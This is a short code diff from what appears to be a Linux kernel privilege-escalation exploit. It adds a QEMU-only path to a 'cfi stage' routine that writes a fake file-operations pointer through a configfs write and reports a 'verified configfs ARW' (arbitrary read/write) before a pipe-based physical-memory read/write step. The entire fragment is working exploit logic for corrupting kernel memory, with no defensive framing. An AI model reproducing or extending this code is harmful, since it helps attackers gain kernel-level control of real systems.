@@ -333,7 +333,8 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
+#if (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE) && \
+    (!defined(SHELL_TRACEFS_SLIDE) || !SHELL_TRACEFS_SLIDE)
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
@@ -346,6 +347,24 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
+
+#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
+  uint64_t writer_null_owner = 0;
+  ssize_t writer_owner = configfs_write_once(
+      fd, fake_fops, &writer_null_owner, sizeof(writer_null_owner));
+  cfi_owner_ret = writer_owner;
+  if (writer_owner != (ssize_t)sizeof(writer_null_owner)) {
+    cfi_last_step = 7;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+  SYSCHK(close(fd));
+  cfi_last_step = 0;
+  cfi_last_errno = 0;
+  atomic_store(&cfi_stage_done, 1);
+  pr_success("QEMU_STACK_WRITER_OK backend reached verified configfs ARW\n");
+  return 1;
+#endif
 
   pr_info("cfi starting pipe physrw\n");
 
